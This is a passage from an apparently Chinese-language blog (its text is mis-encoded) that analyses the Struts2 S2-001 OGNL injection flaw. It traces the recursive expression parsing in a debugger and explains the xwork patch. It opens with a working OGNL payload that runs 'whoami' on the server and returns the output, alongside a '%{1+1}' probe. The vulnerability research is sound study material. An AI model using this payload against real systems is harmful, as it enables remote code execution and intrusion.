<pre><code>%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;whoami&quot;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}</code></pre><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16077775507123.jpg" alt=""></p>
<h2 id="4-æ¼æ´åˆ†æ"><a href="#4-æ¼æ´åˆ†æ" class="headerlink" title="4-æ¼æ´åˆ†æ"></a>4-æ¼æ´åˆ†æ</h2><h3 id="4-1-OGNLè¡¨è¾¾å¼"><a href="#4-1-OGNLè¡¨è¾¾å¼" class="headerlink" title="4.1 OGNLè¡¨è¾¾å¼"></a>4.1 OGNLè¡¨è¾¾å¼</h3><blockquote>
<p><a href="https://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">OGNLè¡¨è¾¾å¼æ³¨å…¥æ¼æ´æ€»ç»“â€“Mi1k7ea</a></p>
</blockquote>
<p>OGNLå…¨ç§°Object-Graph Navigation Languageå³å¯¹è±¡å¯¼èˆªå›¾è¯­è¨€ï¼Œå®ƒæ˜¯ä¸€ç§åŠŸèƒ½å¼ºå¤§çš„è¡¨è¾¾å¼è¯­è¨€ï¼Œé€šè¿‡å®ƒç®€å•ä¸€è‡´çš„è¡¨è¾¾å¼è¯­æ³•ï¼Œå¯ä»¥å­˜å–å¯¹è±¡çš„ä»»æ„å±æ€§ï¼Œè°ƒç”¨å¯¹è±¡çš„æ–¹æ³•ï¼Œéå†æ•´ä¸ªå¯¹è±¡çš„ç»“æ„å›¾ï¼Œå®ç°å­—æ®µç±»å‹è½¬åŒ–ç­‰åŠŸèƒ½ã€‚å®ƒä½¿ç”¨ç›¸åŒçš„è¡¨è¾¾å¼å»å­˜å–å¯¹è±¡çš„å±æ€§ã€‚è¿™æ ·å¯ä»¥æ›´å¥½çš„å–å¾—æ•°æ®ã€‚è€ŒStruts2æ¡†æ¶æ­£æ˜¯å› ä¸ºæ»¥ç”¨OGNLè¡¨è¾¾å¼ï¼Œä½¿ä¹‹æˆä¸ºäº†â€œæ¼æ´ä¹‹ç‹â€ã€‚</p>
<p><strong>OGNLä¸‰è¦ç´ </strong><br>OGNLå…·æœ‰ä¸‰è¦ç´ ï¼šè¡¨è¾¾å¼ï¼ˆexpressionï¼‰ã€æ ¹å¯¹è±¡ï¼ˆrootï¼‰å’Œä¸Šä¸‹æ–‡å¯¹è±¡ï¼ˆcontextï¼‰ã€‚</p>
<ul>
<li>è¡¨è¾¾å¼ï¼ˆexpressionï¼‰ï¼šè¡¨è¾¾å¼æ˜¯æ•´ä¸ªOGNLçš„æ ¸å¿ƒï¼Œé€šè¿‡è¡¨è¾¾å¼æ¥å‘Šè¯‰OGNLéœ€è¦æ‰§è¡Œä»€ä¹ˆæ“ä½œï¼›</li>
<li>æ ¹å¯¹è±¡ï¼ˆrootï¼‰ï¼šrootå¯ä»¥ç†è§£ä¸ºOGNLçš„æ“ä½œå¯¹è±¡ï¼ŒOGNLå¯ä»¥å¯¹rootè¿›è¡Œå–å€¼æˆ–å†™å€¼ç­‰æ“ä½œï¼Œè¡¨è¾¾å¼è§„å®šäº†â€œåšä»€ä¹ˆâ€ï¼Œè€Œæ ¹å¯¹è±¡åˆ™è§„å®šäº†â€œå¯¹è°æ“ä½œâ€ã€‚å®é™…ä¸Šæ ¹å¯¹è±¡æ‰€åœ¨çš„ç¯å¢ƒå°±æ˜¯ OGNL çš„ä¸Šä¸‹æ–‡å¯¹è±¡ç¯å¢ƒï¼›</li>
<li>ä¸Šä¸‹æ–‡å¯¹è±¡ï¼ˆcontextï¼‰ï¼šcontextå¯ä»¥ç†è§£ä¸ºå¯¹è±¡è¿è¡Œçš„ä¸Šä¸‹æ–‡ç¯å¢ƒï¼Œcontextä»¥MAPçš„ç»“æ„ã€åˆ©ç”¨é”®å€¼å¯¹å…³ç³»æ¥æè¿°å¯¹è±¡ä¸­çš„å±æ€§ä»¥åŠå€¼ï¼›</li>
</ul>
<h3 id="S2-001æ¼æ´åˆ†æ"><a href="#S2-001æ¼æ´åˆ†æ" class="headerlink" title="S2-001æ¼æ´åˆ†æ"></a>S2-001æ¼æ´åˆ†æ</h3><p>å…ˆåœ¨è‡ªå®šä¹‰çš„ACtionä¸Šä¸‹ä¸ªæ–­ç‚¹ï¼Œç„¶åå‘é€å¸¦payload <code>%{1+1}</code> çš„è¯·æ±‚ã€‚<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16079333757203.jpg" alt="-w1555"></p>
<p>ä»è°ƒç”¨æ ˆä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨ <code>DefaultActionInvocation</code> ç±»ä¸­åå°„è°ƒç”¨äº†æˆ‘ä»¬è‡ªå®šä¹‰çš„ç±» <code>LoginAction</code>ã€‚<br>è·¯å¾„ï¼š<code>/xwork-2.0.3.jar!/com/opensymphony/xwork2/DefaultActionInvocation.class</code></p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16079336332161.jpg" alt="-w2021"></p>
<p>æ­¤æ—¶åˆ°è¾¾è‡ªå®šä¹‰ç±»<code>LoginAction</code>çš„<code>username</code>çš„å€¼ä¸º<code>%{1+1}</code>ã€‚</p>
<p>æ ¹æ®æŠ«éœ²çš„æ¼æ´è¯¦æƒ…å¯ä»¥çŸ¥é“ï¼Œå¯¼è‡´æ¼æ´çš„åŸå› æ˜¯ç”¨æˆ·æäº¤è¡¨å•æ•°æ®å¹¶ä¸”éªŒè¯å¤±è´¥æ—¶ï¼ŒStruts2é‡æ–°æ¸²æŸ“jspæ—¶åç«¯ä¼šå°†ç”¨æˆ·ä¹‹å‰æäº¤çš„å‚æ•°å€¼ä½¿ç”¨ognlè¡¨è¾¾å¼è¿›è¡Œé€’å½’è§£æç„¶åé‡æ–°å¡«å……åˆ°è¡¨å•ä¸­ã€‚</p>
<p>æ ¹æ®æœ€å¼€å§‹çš„strutså·¥ä½œæµç¨‹å›¾å¯ä»¥çŸ¥é“åœ¨ä¸€ä¸ªhttpè¯·æ±‚è¿›æ¥åï¼Œä¼šç»è¿‡ä¸€ç³»åˆ—çš„ æ‹¦æˆªå™¨(Interceptor) ï¼Œè¿™äº›æ‹¦æˆªå™¨å¯ä»¥æ˜¯ Struts2 è‡ªå¸¦çš„ï¼Œä¹Ÿå¯ä»¥æ˜¯ç”¨æˆ·è‡ªå®šä¹‰çš„ã€‚ä¾‹å¦‚ä¸‹å›¾ struts.xml ä¸­çš„ package ç»§æ‰¿è‡ª struts-default ï¼Œè€Œ struts-default å°±ä½¿ç”¨äº† Struts2 è‡ªå¸¦çš„æ‹¦æˆªå™¨ã€‚</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16079379558395.jpg" alt="-w838"></p>
<p>åœ¨ <code>struts2-core-2.0.8.jar!/struts-default.xml</code> ä¸­å¯ä»¥æ‰¾åˆ°é»˜è®¤ä½¿ç”¨çš„æ‹¦æˆªå™¨æ ˆ <code>defaultStack</code><br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16079380574780.jpg" alt="-w1033"></p>
<p>åœ¨æ‹¦æˆªå™¨æ ˆ <code>defaultStack</code> ä¸­ï¼Œæˆ‘ä»¬éœ€è¦å…³æ³¨ <code>params</code> è¿™ä¸ªæ‹¦æˆªå™¨ã€‚å…¶ä¸­ï¼Œ <code>params</code> æ‹¦æˆªå™¨ ä¼šå°†å®¢æˆ·ç«¯è¯·æ±‚æ•°æ®è®¾ç½®åˆ° <code>å€¼æ ˆ(valueStack)</code> ä¸­<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16079386300645.jpg" alt="-w1226"></p>
<p>åç»­ <code>JSP</code> é¡µé¢ä¸­æ‰€æœ‰çš„åŠ¨æ€æ•°æ®éƒ½å°†ä»å€¼æ ˆä¸­å–å‡ºã€‚</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16079605906528.jpg" alt="-w1523"></p>
<p>è¿™é‡Œæ˜¯è°ƒè¯•çš„æ—¶å€™è¿›å…¥åˆ° <code>setParameters</code> å‡½æ•°ä¸­ï¼ˆF7ï¼‰ï¼Œå¯ä»¥å–Šåˆ°æ¡†ä¸­æ“ä½œæ˜¯æŠŠæˆ‘ä»¬çš„è¾“å…¥æ”¾è¿›äº†å€¼æ ˆ<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16079612927173.jpg" alt="-w1450"></p>
<p>ç»è¿‡ä¸€ç³»åˆ—çš„æ‹¦æˆªå™¨å¤„ç†åï¼Œæ•°æ®ä¼šæˆåŠŸè¿›å…¥å®é™…ä¸šåŠ¡ Action ã€‚ç¨‹åºä¼šæ ¹æ® Action å¤„ç†çš„ç»“æœï¼Œé€‰æ‹©å¯¹åº”çš„ JSP è§†å›¾è¿›è¡Œå±•ç¤ºï¼Œå¹¶å¯¹è§†å›¾ä¸­çš„ Struts2 æ ‡ç­¾è¿›è¡Œå¤„ç†ã€‚<br>å¦‚ä¸‹å›¾ï¼Œåœ¨æœ¬ä¾‹ä¸­ Action å¤„ç†ç”¨æˆ·ç™»å½•å¤±è´¥æ—¶ä¼šè¿”å› error ã€‚</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16079620311725.jpg" alt="-w999"></p>
<p>æ ¹æ®è¿”å›ç»“æœä»¥åŠå…ˆå‰åœ¨ <code>struts.xml</code> ä¸­å®šä¹‰çš„è§†å›¾ï¼š</p>
<pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>struts</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>package</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>S2-001<span class="token punctuation">"</span></span> <span class="token attr-name">extends</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>struts-default<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>action</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>login<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.lanvnal.s2001.action.LoginAction<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>success<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>welcome.jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>result</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>error<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>index.jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>result</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>action</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>package</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>struts</span><span class="token punctuation">></span></span></code></pre>
<p>ç¨‹åºå°†å¼€å§‹å¤„ç† <code>index.jsp</code> ã€‚</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16079976797436.jpg" alt="-w850"></p>
<p>æˆ‘ä»¬çš„<strong>payload</strong>æ˜¯ä»<code>index.jsp</code>è¾“å…¥çš„ï¼Œè¿™é‡Œéœ€è¦äº†è§£çš„æ˜¯<strong>jsp</strong>çš„æœ¬è´¨ä¹Ÿæ˜¯ä¸€ä¸ª<strong>Servlet</strong>ï¼Œåœ¨æ‰§è¡Œjspçš„æ—¶å€™<strong>tomcat</strong>ä¼šå°†å…¶è½¬åŒ–ä¸ºjavaä»£ç ï¼Œæ¯”å¦‚è¿™é‡Œ<code>index.jsp</code>è¢«è½¬åŒ–ä¸º<code>index_jsp.java</code>ã€‚<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16080003848710.jpg" alt="-w851"></p>
<p>å½“åœ¨ JSP æ–‡ä»¶ä¸­é‡åˆ° Struts2 æ ‡ç­¾ <code>&lt;s:textfield</code> æ—¶ï¼Œç¨‹åºä¼šå…ˆè°ƒç”¨ <code>doStartTag</code> ï¼Œå¹¶å°†æ ‡ç­¾ä¸­çš„å±æ€§è®¾ç½®åˆ° <code>TextFieldTag</code> å¯¹è±¡ç›¸åº”å±æ€§ä¸­ã€‚æœ€åï¼Œåœ¨é‡åˆ° <code>/&gt;</code> ç»“æŸæ ‡ç­¾çš„æ—¶å€™è°ƒç”¨ <code>doEndTag</code> æ–¹æ³•ã€‚</p>
<p>è·¯å¾„ï¼š <code>struts2-core-2.0.8.jar!/org/apache/struts2/views/jsp/ComponentTagSupport.class</code><br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16080001208107.jpg" alt="-w1212"></p>
<p>è·¯å¾„ï¼š <code>struts2-core-2.0.8.jar!/org/apache/struts2/views/jsp/ui/AbstractUITag.class</code><br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16080002192291.jpg" alt="-w957"></p>
<p>åœ¨ <code>doEndTag</code> æ–¹æ³•ä¸­è°ƒç”¨äº† <code>this.component.end</code> æ–¹æ³•ï¼Œè€Œè¯¥æ–¹æ³•è°ƒç”¨äº† <code>evaluateParams</code> æ–¹æ³•æ¥å¡«å…… JSP ä¸­çš„åŠ¨æ€æ•°æ®ã€‚<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16080015352601.jpg" alt="-w1038"></p>
<p>step into <code>end</code> æ–¹æ³•,è·¯å¾„ï¼š<code>struts2-core-2.0.8.jar!/org/apache/struts2/components/UIBean.class</code><br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16080005812847.jpg" alt="-w977"></p>
<p>è·Ÿè¿› <code>evaluateParams</code> æ–¹æ³•ï¼Œä¼šå‘ç°å¦‚æœå¼€å¯äº† <code>Ognlè¡¨è¾¾å¼</code> æ”¯æŒ<code>( this.altSyntax() )</code>ï¼Œç¨‹åºä¼šåœ¨å±æ€§å­—æ®µä¸¤è¾¹æ·»åŠ  Ognl è¡¨è¾¾å¼å­—ç¬¦( <code>%{ã€}</code> )ï¼Œç„¶åä½¿ç”¨ <code>findValue</code> æ–¹æ³•ä»å€¼æ ˆä¸­è·å¾—è¯¥è¡¨è¾¾å¼æ‰€å¯¹åº”çš„å€¼ã€‚<br>è·¯å¾„ï¼š <code>struts2-core-2.0.8.jar!/org/apache/struts2/components/UIBean.class</code><br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16080027153004.jpg" alt=""></p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16080029926494.jpg" alt=""></p>
<p>æˆ‘ä»¬æ¥çœ‹ä¸‹ findValue æ–¹æ³•ä¸­ï¼Œå…·ä½“æ˜¯å¦‚ä½•è§£æ Ognl è¡¨è¾¾å¼ã€‚å¦‚ä¸‹å›¾ï¼Œå¯ä»¥çœ‹åˆ° findValue æ–¹æ³•å…ˆè°ƒç”¨äº† translateVariables æ–¹æ³•ï¼Œè¯¥æ–¹æ³•åˆè°ƒç”¨äº†åŒåé‡è½½æ–¹æ³•ã€‚é—®é¢˜å…³é”®ï¼Œå°±åœ¨è¿™ä¸ªåŒåé‡è½½æ–¹æ³•ä¸­ã€‚</p>
<p>è·¯å¾„ï¼š <code>struts2-core-2.0.8.jar!/org/apache/struts2/components/Component.class</code><br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16080035233153.jpg" alt=""></p>
<p>è·¯å¾„ï¼š <code>xwork-2.0.3.jar!/com/opensymphony/xwork2/util/TextParseUtil.class</code><br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16080035685916.jpg" alt=""></p>
<p><code>xwork-2.0.3.jar!/com/opensymphony/xwork2/util/TextParseUtil.class:31</code></p>
<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">static</span> Object <span class="token function">translateVariables</span><span class="token punctuation">(</span><span class="token keyword">char</span> open<span class="token punctuation">,</span> String expression<span class="token punctuation">,</span> ValueStack stack<span class="token punctuation">,</span> Class <span class="token class-name">asType</span><span class="token punctuation">,</span> TextParseUtil<span class="token punctuation">.</span>ParsedValueEvaluator evaluator<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        Object result <span class="token operator">=</span> expression<span class="token punctuation">;</span>

        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">int</span> start <span class="token operator">=</span> expression<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>open <span class="token operator">+</span> <span class="token string">"{"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">int</span> length <span class="token operator">=</span> expression<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">int</span> x <span class="token operator">=</span> start <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>
            <span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>

            <span class="token keyword">while</span><span class="token punctuation">(</span>start <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> x <span class="token operator">&lt;</span> length <span class="token operator">&amp;&amp;</span> count <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">char</span> c <span class="token operator">=</span> expression<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>x<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token string">'{'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token operator">++</span>count<span class="token punctuation">;</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token string">'}'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token operator">--</span>count<span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>

            <span class="token keyword">int</span> end <span class="token operator">=</span> x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>start <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">||</span> end <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">||</span> count <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> XWorkConverter<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">convertValue</span><span class="token punctuation">(</span>stack<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> result<span class="token punctuation">,</span> asType<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            String var <span class="token operator">=</span> expression<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>start <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> end<span class="token punctuation">)</span><span class="token punctuation">;</span>
            Object o <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">findValue</span><span class="token punctuation">(</span>var<span class="token punctuation">,</span> asType<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>evaluator <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                o <span class="token operator">=</span> evaluator<span class="token punctuation">.</span><span class="token function">evaluate</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            String left <span class="token operator">=</span> expression<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> start<span class="token punctuation">)</span><span class="token punctuation">;</span>
            String right <span class="token operator">=</span> expression<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>end <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>o <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>TextUtils<span class="token punctuation">.</span><span class="token function">stringSet</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    result <span class="token operator">=</span> left <span class="token operator">+</span> o<span class="token punctuation">;</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                    result <span class="token operator">=</span> o<span class="token punctuation">;</span>
                <span class="token punctuation">}</span>

                <span class="token keyword">if</span> <span class="token punctuation">(</span>TextUtils<span class="token punctuation">.</span><span class="token function">stringSet</span><span class="token punctuation">(</span>right<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    result <span class="token operator">=</span> result <span class="token operator">+</span> right<span class="token punctuation">;</span>
                <span class="token punctuation">}</span>

                expression <span class="token operator">=</span> left <span class="token operator">+</span> o <span class="token operator">+</span> right<span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                result <span class="token operator">=</span> left <span class="token operator">+</span> right<span class="token punctuation">;</span>
                expression <span class="token operator">=</span> left <span class="token operator">+</span> right<span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span></code></pre>
<p>å…³é”®å°±åœ¨è¿™ä¸ª <code>translateVariables</code> å‡½æ•°ï¼Œåœ¨è°ƒè¯•è¿‡ç¨‹ä¸­å¯ä»¥çœ‹åˆ°ä¼ å…¥çš„usernameï¼ˆexpressionï¼‰å¤šæ¬¡è¿›å…¥è¯¥å‡½æ•°ï¼Œæ¥ä¸‹æ¥å°±åˆ†æä¸€ä¸‹æ¯æ¬¡å‘ç”Ÿçš„å˜åŒ–ã€‚</p>
<p>ç¬¬ä¸€æ¬¡ï¼Œé€šè¿‡ <code>findValue</code> å–å‡º usernameçš„å€¼ï¼Œèµ‹ç»™äº† <code>o</code><br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16080078172140.jpg" alt=""></p>
<p>ç„¶åç»è¿‡ä¸€äº›å¤„ç†ï¼Œæ‹¼æ¥èµ‹å€¼ç»™äº† <code>expression</code> ï¼Œè¿›å…¥ä¸‹ä¸€è½®å¾ªç¯<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16080080286517.jpg" alt=""></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œç¬¬äºŒæ¬¡çš„ <code>o</code> å–å¾—çš„å€¼å·²ç»å˜æˆäº† <code>2</code>ï¼Œè¯´æ˜OGNLè¡¨è¾¾å¼å·²ç»æ‰§è¡Œäº†ã€‚<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16080082535664.jpg" alt=""></p>
<p>æœ€åç»è¿‡åç»­çš„å¤„ç†ï¼Œå›æ˜¾åœ¨äº†è¾“å…¥æ¡†ã€‚</p>
<p>æœ€åç»å…¸å¼¹ä¸ªè®¡ç®—å™¨2333</p>
<p>emmm macå¼¹è®¡ç®—å™¨æ²¡æˆåŠŸï¼Œè¿˜åœ¨æ‰¾åŸå› ã€‚</p>
<h2 id="5-è¡¥ä¸åˆ†æ"><a href="#5-è¡¥ä¸åˆ†æ" class="headerlink" title="5-è¡¥ä¸åˆ†æ"></a>5-è¡¥ä¸åˆ†æ</h2><p>åœ¨ <code>xwork 2.0.4</code> ä¸­æ·»åŠ äº†ä¸€ä¸ªmaxLoopCountå±æ€§ï¼Œé™åˆ¶äº†é€’å½’è§£æçš„æœ€å¤§æ•°ç›®ã€‚<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16080222290205.jpg" alt="-w1382"></p>
<p>ä»è€Œåœ¨è§£æåˆ° <code>%{1+1}</code> æ—¶ï¼Œä¸ä¼šç»§ç»­å‘ä¸‹é€’å½’äº†ï¼Œè¿™æ ·å°±ä¿®å¤äº†è¯¥æ¼æ´ã€‚</p>
<h2 id="6-å‚è€ƒ"><a href="#6-å‚è€ƒ" class="headerlink" title="6-å‚è€ƒ"></a>6-å‚è€ƒ</h2><p><a href="https://mochazz.github.io/2020/06/16/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BStruts2-001/#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D" target="_blank" rel="noopener">Javaä»£ç å®¡è®¡ä¹‹Struts2-001(ä¸€) â€“ mochazz</a></p>
<p><a href="https://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#OGNL%E8%AF%AD%E6%B3%95%E6%A0%91" target="_blank" rel="noopener">OGNLè¡¨è¾¾å¼æ³¨å…¥æ¼æ´æ€»ç»“</a></p>
<p><a href="https://mengsec.com/2019/10/29/Java-Web-S2-001/" target="_blank" rel="noopener">Java web s2-001 â€“ MengSec</a></p>
<p><a href="http://zhengbao.wang/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E4%B9%8Bs2-001%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">javaä»£ç å®¡è®¡å…¥é—¨ä¹‹s2-001å¤ç°åˆ†æ</a></p>
]]></content>
      <categories>
        <category>Javaå®‰å…¨</category>
      </categories>
      <tags>
        <tag>Javaå®‰å…¨</tag>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title>Struts2 æ¼æ´åˆ†æç¯å¢ƒæ­å»º</title>
    <url>/2020/12/15/struts2-lou-dong-fen-xi-huan-jing-da-jian/</url>
    <content><![CDATA[<blockquote>
<p>ä¸ºäº†ä¸å†æ··æ°´æ‘¸é±¼ï¼Œå¼€å§‹è¡¥ä¹ å®‰å…¨åŸºç¡€ï¼Œå¼€å§‹å­¦Javaå®‰å…¨(à¸‡ â€¢Ì€_â€¢Ì)à¸‡ï¼Œä»æœ€ç»å…¸çš„Struts2æ¼æ´å¼€å§‹ï¼Œæœ¬ç¯‡æ˜¯ç¯å¢ƒæ­å»ºè¿‡ç¨‹ã€‚</p>
</blockquote>
<h2 id="1ã€æµ‹è¯•ç¯å¢ƒ"><a href="#1ã€æµ‹è¯•ç¯å¢ƒ" class="headerlink" title="1ã€æµ‹è¯•ç¯å¢ƒ"></a>1ã€æµ‹è¯•ç¯å¢ƒ</h2><pre><code>macOS Catalina ç‰ˆæœ¬ 10.15.6
Java version &quot;1.8.0_261&quot;
IDEA 2020.2
tomcat 9.0.39</code></pre><h2 id="2ã€åˆ›å»ºé¡¹ç›®"><a href="#2ã€åˆ›å»ºé¡¹ç›®" class="headerlink" title="2ã€åˆ›å»ºé¡¹ç›®"></a>2ã€åˆ›å»ºé¡¹ç›®</h2><h3 id="2-1-Maven"><a href="#2-1-Maven" class="headerlink" title="2.1 Maven"></a>2.1 Maven</h3><p>é€šè¿‡Mavenåˆ›å»ºé¡¹ç›®ï¼Œå¦‚ä¸‹å›¾çš„é¡ºåºï¼Œæ³¨æ„å‹¾é€‰<code>Create from archetype</code>,é€‰æ‹©webappã€‚</p>
